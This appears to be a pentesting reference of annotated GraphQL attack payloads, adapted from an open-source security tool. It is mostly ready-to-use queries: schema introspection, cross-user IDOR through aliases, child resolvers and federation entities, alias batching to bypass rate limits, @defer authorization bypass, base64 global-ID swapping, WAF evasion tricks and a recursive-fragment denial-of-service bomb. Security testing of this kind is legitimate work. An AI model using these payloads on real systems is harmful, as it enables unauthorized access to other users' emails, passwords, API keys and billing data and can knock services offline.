<!-- Portions adapted from Strix (https://github.com/usestrix/strix), Apache-2.0, Copyright 2025 OmniSecure Inc.; changed by NullSquare, Inc. See NOTICE. -->

# GraphQL — Annotated Payload Examples

## Introspection

### Full schema dump
```graphql
{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind } } type { name kind } } } } }
```

### Targeted type inspection
```graphql
{ __type(name: "User") { fields { name type { name kind } } } }
```

### Field suggestion harvest (introspection disabled)
```
{ useR { id } }
```
Response: `"Did you mean \"user\"?"` — reveals real field name.

---

## IDOR via Aliases

### Cross-user object access in one request
```graphql
query {
  own:     order(id: "OWNED_ID")   { id total owner { email } }
  foreign: order(id: "FOREIGN_ID") { id total owner { email } }
}
```
Expected: foreign alias should return 403 or null — if it returns data, IDOR confirmed.

### Child resolver cascade gap
```graphql
query {
  user(id: "FOREIGN_USER_ID") {
    id
    privateNotes { content }
    apiKeys { key }
  }
}
```
Parent `user()` may auth-check, child `privateNotes` may not.

---

## Batching Abuse

### Alias-based rate-limit bypass
```graphql
query {
  u1: user(id: "1") { email role }
  u2: user(id: "2") { email role }
  u3: user(id: "3") { email role }
}
```
N aliases = N resolver calls in one HTTP request, bypassing per-request rate limits.

### Array batching (non-standard)
```json
[
  {"query": "{ user(id: \"1\") { email } }"},
  {"query": "{ user(id: \"2\") { email } }"}
]
```

---

## Directive Bypass

### @defer on gated field
```graphql
query {
  me { id username }
  ... @defer { adminDashboard { secretKey allUsers { email } } }
}
```
Content delivered in incremental stream — some servers skip authorization on deferred branches.

---

## Cursor Tampering

### Decode and swap global ID
```bash
# Decode: base64("User:123") = VXNlcjoxMjM=
echo -n "VXNlcjoxMjM=" | base64 -d   # → User:123

# Swap to target ID
echo -n "User:456" | base64            # → VXNlcjo0NTY=
```
```graphql
query {
  node(id: "VXNlcjo0NTY=") { ... on User { email role billingInfo { cardLast4 } } }
}
```

---

## Federation

### SDL exposure
```graphql
{ _service { sdl } }
```

### Entity materialization bypass
```graphql
{
  _entities(representations: [
    { __typename: "User", id: "TARGET_USER_ID" }
  ]) {
    ... on User { email roles adminToken }
  }
}
```
Gateway may enforce auth; subgraph resolver may not — cross-subgraph IDOR.

---

## WAF Evasion

### application/graphql content-type (bypasses JSON WAF rules)
```
POST /graphql HTTP/1.1
Content-Type: application/graphql

{ user(id:"FOREIGN_ID") { email password } }
```

### Fragment splitting to evade field-based signatures
```graphql
fragment a on User { email }
fragment b on User { password apiKeys { key } }
query { user(id: "TARGET") { ...a ...b } }
```

### GET transport
```
GET /graphql?query=%7Buser(id%3A%22TARGET%22)%7Bemail%7D%7D
```

---

## Complexity DoS

### Fragment recursion bomb
```graphql
fragment f on User { friends { ...f } }
query { me { ...f } }
```
Expected: depth limit error. If server hangs or returns 500 after delay → no depth limit enforced.
